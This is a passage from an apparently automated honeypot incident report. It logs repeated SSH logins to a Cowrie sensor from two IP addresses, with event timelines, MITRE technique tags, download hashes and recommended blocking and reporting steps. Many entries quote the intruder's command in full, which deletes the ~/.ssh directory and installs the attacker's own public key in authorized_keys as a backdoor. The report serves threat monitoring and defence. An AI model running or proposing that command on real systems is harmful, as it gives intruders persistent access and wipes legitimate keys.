| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:34:16` | `cowrie.session.connect` |
| `2026-04-23 05:34:16` | `cowrie.client.version` |
| `2026-04-23 05:34:16` | `cowrie.client.kex` |
| `2026-04-23 05:34:17` | `cowrie.login.success` |
| `2026-04-23 05:34:17` | `cowrie.session.params` |
| `2026-04-23 05:34:17` | `cowrie.command.input` |
| `2026-04-23 05:34:17` | `cowrie.command.failed` |
| `2026-04-23 05:34:17` | `cowrie.log.closed` |
| `2026-04-23 05:34:17` | `cowrie.session.params` |
| `2026-04-23 05:34:17` | `cowrie.command.input` |
| `2026-04-23 05:34:18` | `cowrie.session.file_download` |
| `2026-04-23 05:34:18` | `cowrie.log.closed` |
| `2026-04-23 05:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a7497bdd0b3

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:34 |
| **Last Seen** | 2026-04-23 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:34:20` | `cowrie.session.connect` |
| `2026-04-23 05:34:20` | `cowrie.client.version` |
| `2026-04-23 05:34:20` | `cowrie.client.kex` |
| `2026-04-23 05:34:20` | `cowrie.login.success` |
| `2026-04-23 05:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c958086ec468

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:35 |
| **Last Seen** | 2026-04-23 05:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:35:58` | `cowrie.session.connect` |
| `2026-04-23 05:35:58` | `cowrie.client.version` |
| `2026-04-23 05:35:58` | `cowrie.client.kex` |
| `2026-04-23 05:35:58` | `cowrie.login.success` |
| `2026-04-23 05:35:59` | `cowrie.session.params` |
| `2026-04-23 05:35:59` | `cowrie.command.input` |
| `2026-04-23 05:35:59` | `cowrie.command.failed` |
| `2026-04-23 05:35:59` | `cowrie.log.closed` |
| `2026-04-23 05:35:59` | `cowrie.session.params` |
| `2026-04-23 05:35:59` | `cowrie.command.input` |
| `2026-04-23 05:35:59` | `cowrie.session.file_download` |
| `2026-04-23 05:35:59` | `cowrie.log.closed` |
| `2026-04-23 05:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b201f5587717

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:36 |
| **Last Seen** | 2026-04-23 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:36:01` | `cowrie.session.connect` |
| `2026-04-23 05:36:01` | `cowrie.client.version` |
| `2026-04-23 05:36:01` | `cowrie.client.kex` |
| `2026-04-23 05:36:02` | `cowrie.login.success` |
| `2026-04-23 05:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba1b2096c7d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:36 |
| **Last Seen** | 2026-04-23 05:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:36:09` | `cowrie.session.connect` |
| `2026-04-23 05:36:09` | `cowrie.client.version` |
| `2026-04-23 05:36:09` | `cowrie.client.kex` |
| `2026-04-23 05:36:10` | `cowrie.login.success` |
| `2026-04-23 05:36:10` | `cowrie.session.params` |
| `2026-04-23 05:36:10` | `cowrie.command.input` |
| `2026-04-23 05:36:10` | `cowrie.command.failed` |
| `2026-04-23 05:36:10` | `cowrie.log.closed` |
| `2026-04-23 05:36:10` | `cowrie.session.params` |
| `2026-04-23 05:36:10` | `cowrie.command.input` |
| `2026-04-23 05:36:10` | `cowrie.session.file_download` |
| `2026-04-23 05:36:10` | `cowrie.log.closed` |
| `2026-04-23 05:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53e5247edb7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:36 |
| **Last Seen** | 2026-04-23 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:36:12` | `cowrie.session.connect` |
| `2026-04-23 05:36:12` | `cowrie.client.version` |
| `2026-04-23 05:36:12` | `cowrie.client.kex` |
| `2026-04-23 05:36:13` | `cowrie.login.success` |
| `2026-04-23 05:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb04d1160d43

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:36 |
| **Last Seen** | 2026-04-23 05:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:36:49` | `cowrie.session.connect` |
| `2026-04-23 05:36:49` | `cowrie.client.version` |
| `2026-04-23 05:36:49` | `cowrie.client.kex` |
| `2026-04-23 05:36:50` | `cowrie.login.success` |
| `2026-04-23 05:36:50` | `cowrie.session.params` |
| `2026-04-23 05:36:50` | `cowrie.command.input` |
| `2026-04-23 05:36:50` | `cowrie.command.failed` |
| `2026-04-23 05:36:50` | `cowrie.log.closed` |
| `2026-04-23 05:36:50` | `cowrie.session.params` |
| `2026-04-23 05:36:50` | `cowrie.command.input` |
| `2026-04-23 05:36:51` | `cowrie.session.file_download` |
| `2026-04-23 05:36:51` | `cowrie.log.closed` |
| `2026-04-23 05:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eecc7d29074

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:36 |
| **Last Seen** | 2026-04-23 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:36:53` | `cowrie.session.connect` |
| `2026-04-23 05:36:53` | `cowrie.client.version` |
| `2026-04-23 05:36:53` | `cowrie.client.kex` |
| `2026-04-23 05:36:53` | `cowrie.login.success` |
| `2026-04-23 05:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f370cb7c5ac8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:39 |
| **Last Seen** | 2026-04-23 05:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:39:13` | `cowrie.session.connect` |
| `2026-04-23 05:39:13` | `cowrie.client.version` |
| `2026-04-23 05:39:13` | `cowrie.client.kex` |
| `2026-04-23 05:39:14` | `cowrie.login.success` |
| `2026-04-23 05:39:14` | `cowrie.session.params` |
| `2026-04-23 05:39:14` | `cowrie.command.input` |
| `2026-04-23 05:39:14` | `cowrie.command.failed` |
| `2026-04-23 05:39:14` | `cowrie.log.closed` |
| `2026-04-23 05:39:14` | `cowrie.session.params` |
| `2026-04-23 05:39:14` | `cowrie.command.input` |
| `2026-04-23 05:39:14` | `cowrie.session.file_download` |
| `2026-04-23 05:39:14` | `cowrie.log.closed` |
| `2026-04-23 05:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d90511d12cae

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:39 |
| **Last Seen** | 2026-04-23 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:39:16` | `cowrie.session.connect` |
| `2026-04-23 05:39:16` | `cowrie.client.version` |
| `2026-04-23 05:39:16` | `cowrie.client.kex` |
| `2026-04-23 05:39:17` | `cowrie.login.success` |
| `2026-04-23 05:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186739a68cd0

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:41 |
| **Last Seen** | 2026-04-23 05:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:41:02` | `cowrie.session.connect` |
| `2026-04-23 05:41:02` | `cowrie.client.version` |
| `2026-04-23 05:41:02` | `cowrie.client.kex` |
| `2026-04-23 05:41:02` | `cowrie.login.success` |
| `2026-04-23 05:41:03` | `cowrie.session.params` |
| `2026-04-23 05:41:03` | `cowrie.command.input` |
| `2026-04-23 05:41:03` | `cowrie.command.failed` |
| `2026-04-23 05:41:03` | `cowrie.log.closed` |
| `2026-04-23 05:41:03` | `cowrie.session.params` |
| `2026-04-23 05:41:03` | `cowrie.command.input` |
| `2026-04-23 05:41:03` | `cowrie.session.file_download` |
| `2026-04-23 05:41:03` | `cowrie.log.closed` |
| `2026-04-23 05:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0eff9b61f9

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:41 |
| **Last Seen** | 2026-04-23 05:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:41:05` | `cowrie.session.connect` |
| `2026-04-23 05:41:05` | `cowrie.client.version` |
| `2026-04-23 05:41:05` | `cowrie.client.kex` |
| `2026-04-23 05:41:06` | `cowrie.login.success` |
| `2026-04-23 05:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7cb8b5e9846

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:41 |
| **Last Seen** | 2026-04-23 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:41:08` | `cowrie.session.connect` |
| `2026-04-23 05:41:08` | `cowrie.client.version` |
| `2026-04-23 05:41:08` | `cowrie.client.kex` |
| `2026-04-23 05:41:08` | `cowrie.login.success` |
| `2026-04-23 05:41:09` | `cowrie.session.params` |
| `2026-04-23 05:41:09` | `cowrie.command.input` |
| `2026-04-23 05:41:09` | `cowrie.command.failed` |
| `2026-04-23 05:41:09` | `cowrie.log.closed` |
| `2026-04-23 05:41:09` | `cowrie.session.params` |
| `2026-04-23 05:41:09` | `cowrie.command.input` |
| `2026-04-23 05:41:09` | `cowrie.session.file_download` |
| `2026-04-23 05:41:09` | `cowrie.log.closed` |
| `2026-04-23 05:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1209a98ee6e1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:41 |
| **Last Seen** | 2026-04-23 05:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:41:11` | `cowrie.session.connect` |
| `2026-04-23 05:41:11` | `cowrie.client.version` |
| `2026-04-23 05:41:11` | `cowrie.client.kex` |
| `2026-04-23 05:41:11` | `cowrie.login.success` |
| `2026-04-23 05:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-034abbc47d15

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:42 |
| **Last Seen** | 2026-04-23 05:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:42:41` | `cowrie.session.connect` |
| `2026-04-23 05:42:41` | `cowrie.client.version` |
| `2026-04-23 05:42:41` | `cowrie.client.kex` |
| `2026-04-23 05:42:42` | `cowrie.login.success` |
| `2026-04-23 05:42:42` | `cowrie.session.params` |
| `2026-04-23 05:42:42` | `cowrie.command.input` |
| `2026-04-23 05:42:42` | `cowrie.command.failed` |
| `2026-04-23 05:42:42` | `cowrie.log.closed` |
| `2026-04-23 05:42:42` | `cowrie.session.params` |
| `2026-04-23 05:42:42` | `cowrie.command.input` |
| `2026-04-23 05:42:42` | `cowrie.session.file_download` |
| `2026-04-23 05:42:42` | `cowrie.log.closed` |
| `2026-04-23 05:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6873937fc1bf

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:42 |
| **Last Seen** | 2026-04-23 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:42:44` | `cowrie.session.connect` |
| `2026-04-23 05:42:44` | `cowrie.client.version` |
| `2026-04-23 05:42:45` | `cowrie.client.kex` |
| `2026-04-23 05:42:45` | `cowrie.login.success` |
| `2026-04-23 05:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200583b66860

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:45 |
| **Last Seen** | 2026-04-23 05:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:45:04` | `cowrie.session.connect` |
| `2026-04-23 05:45:04` | `cowrie.client.version` |
| `2026-04-23 05:45:04` | `cowrie.client.kex` |
| `2026-04-23 05:45:04` | `cowrie.login.success` |
| `2026-04-23 05:45:05` | `cowrie.session.params` |
| `2026-04-23 05:45:05` | `cowrie.command.input` |
